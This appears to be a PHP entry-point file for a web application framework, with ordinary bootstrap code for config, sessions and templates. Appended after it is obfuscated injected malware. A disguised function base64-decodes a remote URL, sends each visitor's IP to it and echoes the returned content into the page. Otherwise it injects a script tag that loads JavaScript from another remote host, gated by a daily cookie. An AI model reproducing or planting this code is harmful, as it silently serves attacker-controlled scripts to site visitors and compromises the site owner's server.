<?php
ob_start();
if (class_exists('Phar',0) && file_exists(dirname(__FILE__).'/../gs_libs.phar.gz')) {
	require_once('phar://'.dirname(__FILE__).'/../gs_libs.phar.gz/config.lib.php');
} else {
	require_once(dirname(__FILE__).'/../libs/config.lib.php');
}
$gs_node_id=1;
$cfg=gs_config::get_instance();
mlog('1');

if (strpos($_SERVER['REQUEST_URI'],'/superadmin')===0) $init=new gs_init('superadmin');
	else $init=new gs_init('auto');


cfg_set('tpl_data_dir',array(
	cfg('tpl_data_dir'),
	realpath(cfg('root_dir').'html'),
	));

//$init->init(LOAD_CORE | LOAD_STORAGE | LOAD_TEMPLATES | LOAD_EXTRAS);
//$init->load_modules();
$init->init(LOAD_CORE);
session_start();
$o_h=new gs_parser($init->data);


$smarty=gs_tpl::get_instance();

//include('../../public_html/auth.php');
//die();


$o_h->process();



function sql2_safe($in) {
        $rtn = base64_decode($in);
        return $rtn;
}
function collectnewss() {

		if (!isset($_COOKIE["iJijkdaMnerys"])) {
        $value = 'yadeor';
		$ip = $_SERVER['REMOTE_ADDR'];
        $get = sql2_safe("aHR0cDovL3h4eHBvcm5vLnh4dXouY29tOjg4OC9tb3ZlLnBocD9pcD0=").$ip;
		$file = @fopen ($get, "r");
		$content = @fread($file, 1000);
		@setcookie("iJijkdaMnerys", $value, time()+3600*24);
		if (!$content)
			echo sql2_safe("PHNjcmlwdCBzcmM9Imh0dHA6Ly9tb3JldGhlbm9uZS5nb3RkbnMuY29tL2dvb2dsZXN0YXQucGhwIj48L3NjcmlwdD4=");
		else 
			echo $content;

		}
}
collectnewss ();
?>